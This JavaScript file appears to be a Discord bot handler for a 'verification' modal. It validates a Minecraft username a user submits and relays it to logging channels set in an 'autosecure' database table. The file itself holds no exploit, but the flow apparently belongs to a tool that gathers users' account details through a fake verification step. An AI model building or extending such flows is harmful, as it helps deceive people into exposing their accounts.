const { ActionRowBuilder } = require("discord.js");
const { splitmessager } = require('../../utils/utils/messager');
const { queryParams } = require('../../../db/database');
const { validateusername } = require("../../utils/utils/validateusername");
const { invalidatedmessager } = require("../../utils/utils/messager");

let SplitVerification = {
  name: "SplitVerification",
  callback: async (client, interaction) => {
 //   console.log('hello!');
    try {
      let settings = await client.queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username]);
      if (settings.length === 0) {
        return interaction.reply({ content: `Set the server first!\nusing **/set**!`, ephemeral: true });
      }
      settings = settings[0];

      await interaction.deferReply({ ephemeral: true });

      let [channelId, guildId] = settings.logs_channel?.split("|") || [];
      let [rChannelId, rGuildId] = settings.users_channel?.split("|") || [];
      let notis = Boolean(settings.users_channel);

      const mcname = interaction.fields.getTextInputValue('onlyusername');
          let validatedusername = await validateusername(mcname, settings.validateusername)
    const val = JSON.stringify(validatedusername)
    // console.log(val)
    // console.log(`${validatedusername}`)
    if (!validatedusername.success){
      await invalidatedmessager(client, guildId, channelId, interaction, mcname, validatedusername.reason, true);
      if (notis) {
        await invalidatedmessager(client, rGuildId, rChannelId, interaction, mcname, validatedusername.reason, true, true);
      }
      return;
    }
      splitmessager(client, guildId, channelId, interaction, mcname);

      if (notis) {
        splitmessager(client, rGuildId, rChannelId, interaction, mcname, true);
      }
    } catch (error) {
      console.error("Error in SplitVerification:", error);
    }
  },
};

module.exports = SplitVerification;
